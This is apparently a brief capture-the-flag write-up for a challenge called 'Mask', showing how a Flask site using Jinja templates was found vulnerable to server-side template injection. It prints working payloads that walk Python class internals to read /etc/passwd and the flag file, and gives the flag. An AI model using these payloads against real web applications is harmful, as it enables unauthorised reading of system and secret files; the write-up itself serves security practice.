# Mask

This website was developed in Flask. And it uses Jinja as a template engine. this was specifically mentioned on the website.  

So there must be some kind of template injection, to check I submitted `{{ 40 + 2 }}` and it rendered `42` on the page.
![42](1.png)

Then I tried to get `/etc/passwd` with the following template
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
```
![etc/passwd](2.png)

It worked! Next thing to do was to find where the flag was stored, 
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]("flag.txt").read() }}
```
And it worked!
![Flag](2.png)

> ### LLS{server_side_template_injection_unmasked}